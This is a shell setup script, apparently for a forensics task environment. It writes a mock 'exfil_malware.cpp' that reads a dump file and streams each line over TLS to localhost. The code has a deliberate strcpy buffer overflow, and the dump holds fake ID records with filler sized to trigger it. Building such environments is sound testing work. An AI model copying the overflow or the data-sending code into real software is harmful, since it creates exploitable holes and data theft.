#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip g++ libssl-dev openssl iproute2 util-linux
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/forensics

    cat << 'EOF' > /home/user/forensics/exfil_malware.cpp
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

void parse_and_send(const std::string& data, SSL* ssl) {
    char buffer[64];
    // VULNERABILITY: buffer overflow
    strcpy(buffer, data.c_str());

    SSL_write(ssl, buffer, strlen(buffer));
    SSL_write(ssl, "\n", 1);
}

int main() {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(8443);
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        return 1;
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) {
        return 1;
    }

    std::ifstream infile("/home/user/forensics/dump.bin");
    std::string line;
    while (std::getline(infile, line)) {
        // Simple mock decryption: reverse the string (or just pass it)
        parse_and_send(line, ssl);
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
    return 0;
}
EOF

    cat << 'EOF' > /home/user/forensics/dump.bin
USER: alice, ID: 123-45-6789, ROLE: admin, EXTRA_DATA_TO_TRIGGER_OVERFLOW: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
USER: bob, ID: 987-65-4321, ROLE: user, EXTRA_DATA_TO_TRIGGER_OVERFLOW: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
EOF

    chmod -R 777 /home/user
